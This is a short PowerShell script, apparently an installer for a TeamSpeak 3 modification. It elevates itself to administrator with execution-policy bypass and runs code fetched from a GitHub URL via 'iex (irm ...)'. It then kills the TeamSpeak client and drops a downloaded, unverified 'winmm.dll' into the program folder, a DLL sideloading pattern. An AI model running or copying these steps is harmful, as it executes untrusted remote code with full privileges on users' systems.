param(
    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/TS3DLL.PS1/main/winmm.dll',
    [string]$p = '',
    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/TS3DLL.PS1/main/TS3DLL.ps1'
)

$ProgressPreference = 'Continue'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ue = $u.Replace("'", "''"); $pe = $p.Replace("'", "''"); $se = $s.Replace("'", "''")
    Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
    exit
}

$t = if ($p -and (Test-Path $p)) { $p } elseif (Test-Path "$env:ProgramFiles\TeamSpeak 3 Client") { "$env:ProgramFiles\TeamSpeak 3 Client" }
     elseif (Test-Path "${env:ProgramFiles(x86)}\TeamSpeak 3 Client") { "${env:ProgramFiles(x86)}\TeamSpeak 3 Client" }
     else { exit 1 }

Get-Process ts3client_win64,ts3client_win32 -EA 0 | Stop-Process -Force -EA 0
$f = Join-Path $env:TEMP 'wmm.tmp'
Invoke-WebRequest $u -OutFile $f -UseBasicParsing
Copy-Item $f (Join-Path $t 'winmm.dll') -Force
Remove-Item $f -Force -EA 0
Write-Host 'OK'
